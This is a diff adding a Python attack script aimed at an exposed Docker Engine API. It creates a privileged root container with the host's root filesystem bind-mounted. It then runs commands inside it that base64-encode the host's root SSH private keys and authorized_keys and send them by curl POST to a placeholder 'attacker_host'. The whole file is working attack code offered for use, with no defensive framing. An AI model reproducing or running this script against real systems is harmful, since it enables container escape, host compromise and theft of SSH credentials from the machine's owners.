@@ -1,0 +1,75 @@
+import requests
+import json
+import time
+
+# === CONFIG ===
+target = "http://x.X.x.X:xxx"
+image = "<YOUR IMAGE>"
+attacker_host = "http://x.X.x.X:8000"
+container_cmd = "while true; do sleep 1; done"
+
+# SSH key targets
+ssh_targets = [
+    "/host/root/.ssh/id_rsa",
+    "/host/root/.ssh/id_ecdsa",
+    "/host/root/.ssh/id_ed25519",
+    "/host/root/.ssh/authorized_keys"
+]
+
+# Function to run a command inside the container
+def exec_command(container_id, command):
+    print(f"[*] Creating exec for: {command}")
+    exec_payload = {
+        "AttachStdout": True,
+        "AttachStderr": True,
+        "Cmd": ["sh", "-c", command]
+    }
+    r = requests.post(f"{target}/containers/{container_id}/exec", json=exec_payload)
+    exec_id = r.json().get("Id")
+    if not exec_id:
+        print("[-] Failed to create exec")
+        return False
+    r = requests.post(f"{target}/exec/{exec_id}/start", json={"Detach": False, "Tty": False})
+    return r.status_code == 200
+
+# Step 1: Create container
+print("[*] Creating container...")
+container_create_payload = {
+    "Image": image,
+    "User": "0",
+    "Cmd": ["sh", "-c", container_cmd],
+    "HostConfig": {
+        "Binds": ["/:/host"],
+        "Privileged": True
+    }
+}
+r = requests.post(f"{target}/containers/create", json=container_create_payload)
+if r.status_code != 201:
+    print("[-] Container creation failed:", r.text)
+    exit(1)
+container_id = r.json()["Id"]
+print(f"[+] Container ID: {container_id}")
+
+# Step 2: Start container
+print("[*] Starting container...")
+r = requests.post(f"{target}/containers/{container_id}/start")
+if r.status_code not in [204, 200]:
+    print("[-] Failed to start container:", r.text)
+    exit(1)
+print("[+] Container running")
+
+# Step 3: Give it a moment
+time.sleep(2)
+
+# Step 4: Attempt SSH key exfiltration
+for path in ssh_targets:
+    fname = path.split("/")[-1]
+    exfil_cmd = f"base64 {path} | curl -X POST -d @- {attacker_host}/ssh/{fname}"
+    print(f"[*] Trying to exfil: {path}")
+    if exec_command(container_id, exfil_cmd):
+        print(f"[+] Exfil triggered for: {path}")
+        break
+    else:
+        print(f"[!] Failed to read: {path}")
+else:
+    print("[-] All SSH key exfil attempts failed.")
